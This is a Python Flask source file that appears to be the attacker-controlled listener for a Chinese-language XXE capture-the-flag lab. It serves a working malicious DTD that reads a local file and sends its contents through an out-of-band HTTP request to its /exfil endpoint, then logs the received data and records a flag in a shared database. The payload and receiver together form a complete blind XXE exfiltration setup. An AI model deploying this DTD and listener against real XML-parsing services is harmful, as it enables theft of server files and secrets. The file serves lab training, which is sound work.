# -*- coding: utf-8 -*-
"""
XXE 攻击者监听站 —— XXE 靶场配套
端口: 5033
角色: 攻击者控制的服务器。提供 /evil.dtd（恶意 DTD），并接收 OOB 盲打传回的数据。
     收到 exfil 请求时，若数据含 FLAG3 则写入共享数据库（xmlforge.db）。
"""
import os
import sqlite3
from flask import Flask, request, redirect

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(BASE_DIR, "xmlforge.db")
PORT = 5033

app = Flask(__name__)

FLAG3 = "FLAG3{xxe_oob_exfil_2026}"

# 恶意 DTD：读本地文件 → 内容拼进 URL → exfil 到本监听站
DTD_PATH = os.path.join(BASE_DIR, "xmlforge_oob_secret.txt").replace("\\", "/")
EVIL_DTD = (
    '<!ENTITY % file SYSTEM "file:///__PATH__">\n'
    "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5033/exfil?d=%file;'>\">\n"
    '%eval;\n'
    '%exfil;\n'
).replace("__PATH__", DTD_PATH)


def set_flag3():
    db = sqlite3.connect(DB)
    db.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, flag1 TEXT, flag2 TEXT, flag3 TEXT)")
    db.execute("INSERT OR IGNORE INTO users (id) VALUES (1)")
    db.execute("UPDATE users SET flag3=? WHERE id=1", (FLAG3,))
    db.commit()
    db.close()


STYLE = ("body{font-family:system-ui,Arial,sans-serif;max-width:760px;margin:30px auto;padding:0 16px;"
         "background:#200f0f;color:#e6e6e6}"
         "h1{color:#F09595;margin:0 0 8px}"
         ".card{background:#2a1818;border:1px solid #5a3030;border-radius:10px;padding:14px;margin:14px 0}"
         "code{background:#1a0d0d;padding:2px 5px;border-radius:4px;color:#F5C4B3}"
         "pre{background:#1a0d0d;border:1px solid #5a3030;border-radius:6px;padding:10px;overflow-x:auto;font-size:12px;white-space:pre-wrap}"
         ".warn{color:#F09595;font-weight:bold}"
         ".ok{color:#7fffa0}"
         "table{border-collapse:collapse;width:100%}"
         "td,th{border:1px solid #5a3030;padding:6px 8px;font-size:12px;text-align:left}")


def page(title, body):
    return ("<!doctype html><html lang='zh'><head><meta charset='utf-8'>"
            "<title>" + title + "</title><style>" + STYLE + "</style></head><body>"
            "<h1>☠ 攻击者服务器</h1><p class='warn'>攻击者视角：这里是 exfil 数据接收站</p>"
            + body + "</body></html>")


@app.route("/")
def index():
    body = ("<div class='card'><h2>接收到的 OOB 数据</h2>"
            "<p>当靶场服务器解析你提交的 XML 时，会加载下面的 <code>/evil.dtd</code>，"
            "并把读到的文件内容拼进 URL 请求到这里。</p>"
            "<p>攻击者页面：<a href='/evil.dtd'>/evil.dtd（恶意 DTD 源码）</a></p>"
            "<pre>" + get_exfil_records() + "</pre></div>")
    return page("攻击者监听站", body)


def get_exfil_records():
    """从内存/日志文件读取 exfil 记录"""
    log = os.path.join(BASE_DIR, "xxe_exfil.log")
    if os.path.exists(log):
        with open(log, "r", encoding="utf-8", errors="ignore") as f:
            return f.read() or "（还没有收到数据）"
    return "（还没有收到数据）"


@app.route("/evil.dtd")
def evil_dtd():
    return EVIL_DTD, 200, {"Content-Type": "application/xml-dtd"}


@app.route("/exfil")
def exfil():
    d = request.args.get("d", "")
    # 记录收到的数据
    log = os.path.join(BASE_DIR, "xxe_exfil.log")
    with open(log, "a", encoding="utf-8", errors="ignore") as f:
        f.write("[%s] exfil?d=%s\n" % (request.remote_addr, d))
    # 若数据含 FLAG3 → 写数据库
    if "FLAG3" in d:
        set_flag3()
    return "ok"


@app.route("/reset")
def reset():
    log = os.path.join(BASE_DIR, "xxe_exfil.log")
    if os.path.exists(log):
        os.remove(log)
    db = sqlite3.connect(DB)
    db.execute("UPDATE users SET flag3=NULL WHERE id=1")
    db.commit()
    db.close()
    return redirect("/")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, threaded=True)
